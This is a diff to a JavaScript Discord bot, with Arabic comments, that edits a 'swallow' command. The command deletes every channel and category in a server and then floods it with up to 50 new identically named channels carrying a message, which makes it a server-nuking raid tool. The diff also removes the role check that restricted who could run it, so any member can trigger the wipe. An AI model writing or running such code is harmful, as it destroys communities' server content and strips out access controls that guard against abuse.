@@ -1027,35 +1027,31 @@ ___**`
     }
 
 // ==============================
-// 💥 أمر ابلع
+// 💥 أمر نعاس ابلع
 // ==============================
-if (message.content.startsWith('ابلع ')) {
-
-    // الرتبة المسموح لها
-    const ALLOWED_ROLE_ID = '1535139464702066788';
-
-    if (!message.member.roles.cache.has(ALLOWED_ROLE_ID)) {
-        return message.reply('❌ ما عندكش صلاحية تستخدم الأمر.');
-    }
+if (message.content.startsWith('نعاس ابلع ')) {
 
     const args = message.content.trim().split(/\s+/);
 
-    // ابلع + اسم + رسالة + عدد
-    if (args.length < 4) {
-        return message.reply('❌ الاستخدام الصحيح:\n`ابلع اسم_الروم الرسالة عدد`');
+    // نعاس + ابلع + اسم الروم + العدد + الرسالة
+    if (args.length < 5) {
+        return message.reply(
+            '❌ الاستخدام الصحيح:\n`نعاس ابلع اسم_الروم عدد_الرومات الرسالة`'
+        );
     }
 
-    const roomName = args[1];
-    const count = parseInt(args[args.length - 1]);
+    const roomName = args[2];
+    const count = parseInt(args[3]);
 
     if (isNaN(count) || count < 1 || count > 50) {
         return message.reply('❌ عدد الرومات لازم يكون من 1 إلى 50.');
     }
 
-    // الرسالة بين اسم الروم والعدد
-    const text = args.slice(2, -1).join(' ');
+    // الرسالة بعد اسم الروم والعدد
+    const text = args.slice(4).join(' ');
 
     try {
+
         // حذف جميع الرومات والتصنيفات
         for (const channel of message.guild.channels.cache.values()) {
             try {
@@ -1067,6 +1063,7 @@ if (message.content.startsWith('ابلع ')) {
 
         // إنشاء الرومات الجديدة
         for (let i = 0; i < count; i++) {
+
             const channel = await message.guild.channels.create({
                 name: roomName,
                 type: 0
@@ -1078,6 +1075,7 @@ if (message.content.startsWith('ابلع ')) {
     } catch (err) {
         console.error(err);
     }
+}
 }
 });
 
